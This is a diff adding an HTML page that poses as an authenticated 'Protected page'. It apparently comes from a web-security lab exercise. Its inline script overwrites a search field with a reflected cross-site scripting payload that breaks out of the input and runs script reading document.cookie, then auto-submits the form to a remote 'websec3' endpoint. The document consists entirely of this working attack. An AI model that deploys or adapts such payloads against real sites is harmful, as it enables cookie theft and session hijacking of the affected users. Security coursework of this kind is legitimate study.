@@ -1,0 +1,30 @@
+<html>
+  <head>
+    <meta charset="utf-8">
+    <title>Protected page</title>
+    <style type="text/css">
+      td { width: 150px; border: 1px solid #cccccc; }
+    </style>
+    <script>
+        function changeInput() {
+            document.getElementById("keyword").value = "\"\>\<script\>alert\(document.cookie.split\('\;'\)\)\<\/script\>";
+            document.getElementById("message_form").submit();
+            return true;
+        }
+    </script>
+  </head>
+  <body data-new-gr-c-s-check-loaded="14.1167.0" data-gr-ext-installed="" cz-shortcut-listen="true">
+    <section class="container">
+      <h1>Welcome user2!</h1>
+      This page is protected by authentication.<br><br>
+      <p>
+        </p><form name="message_form" id="message_form" method="post" onsubmit="changeInput();" action="http://193.226.17.35/websec3/index.php">
+          <strong>Search for records: </strong><br>
+          <input type="text" style="width: 400px" id="keyword" name="keyword" value="" placeholder="keyword"><br>
+          <input type="submit" value="submit">
+        </form>
+      <p></p>
+      <a href="index.php?c=logout">Logout</a>
+    </section>
+  </body>
+</html>
